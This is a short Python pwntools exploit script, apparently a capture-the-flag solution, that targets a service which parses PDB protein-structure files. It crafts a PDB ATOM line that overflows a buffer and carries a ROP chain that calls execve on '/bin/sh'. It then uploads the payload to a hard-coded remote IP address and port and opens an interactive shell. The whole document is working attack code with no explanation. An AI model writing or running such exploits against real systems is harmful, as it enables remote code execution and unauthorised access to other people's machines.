#!/usr/bin/python
from pwn import *
context.arch = 'amd64'
 
a = '''ATOM   1211  A   HIS A 152      -7.177  -6.547   0.600  1.00  0.00           '''
a += "C"*27
a += p64(0x4014bb)
a += p64(0x716ff0)*11
a += flat(0x000000000040066f, 0, 0x000000000049ad99, 0x8, 0x716ff0, 0x416c36, 0, 0x497d35)
a += flat(0x000000000040066f, 0x716ff0, 0x000000000049ad99, 0, 0, 0x416c36, 0x3b, 0x497d35)
 
open("test2.pdb","w").write(a)
 
s = remote("52.79.32.226", 13100)
data = b64e(a)
s.sendlineafter(": ", str(len(data)))
s.send(data)
s.recvuntil("uploaded in ")
filename = s.recvuntil("\n")[:-1]
s.sendlineafter("  Enter the PDB file name : ", filename)
s.send("/bin/sh\x00")
 
s.interactive()

